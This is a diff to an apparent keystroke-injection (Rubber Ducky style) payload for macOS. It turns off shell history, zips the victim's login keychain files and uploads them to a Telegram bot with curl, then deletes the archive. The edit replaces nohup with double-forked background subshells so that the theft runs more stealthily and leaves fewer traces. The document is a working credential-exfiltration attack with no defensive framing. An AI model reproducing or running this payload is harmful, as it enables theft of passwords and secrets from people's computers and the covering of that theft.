@@ -16,11 +16,11 @@ STRING unset HISTFILE
 ENTER
 
 REM Gather keychain data
-STRING nohup bash -c cd ~/Library/Keychains/ && zip login.zip login.keychain* &>/dev/null
+STRING ((bash -c cd ~/Library/Keychains/ && zip login.zip login.keychain* &>/dev/null &)&)
 ENTER
 
 REM Send files to Telegram channel + remove trace
-STRING curl -v -F "chat_id=<your_chat_id>" -F document=@login.zip https://api.telegram.org/bot<your_bot_id>/sendDocument && rm login.zip nohup.out &>/dev/null
+STRING ((curl -v -F "chat_id=<your_chat_id>" -F document=@login.zip https://api.telegram.org/bot<your_bot_id>/sendDocument && rm login.zip &>/dev/null &)&)
 ENTER
 
 REM Quit terminal
